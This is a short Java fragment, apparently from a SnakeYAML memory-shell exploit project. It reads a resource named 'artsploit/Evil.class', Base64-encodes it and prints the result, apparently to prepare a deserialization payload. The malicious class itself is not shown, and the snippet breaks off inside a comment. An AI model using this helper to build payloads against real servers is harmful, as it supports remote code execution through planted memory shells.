...
public class Main {
    ...
    public static void main(String[] args) throws IOException {
        InputStream in = Main.class.getClassLoader().getResourceAsStream("artsploit/Evil.class");
        byte[] bytes = new byte[in.available()];
        in.read(bytes);
        Charset charset = StandardCharsets.UTF_8;
        byte[] fileContent2 = Base64.getEncoder().encode(bytes);
        String fileContent = new String(fileContent2, charset);
        System.out.println(fileContent.toString());
       /*
        File file = new File("C:\\javademo\\snakeyaml-memshell-master\\Evil.class");
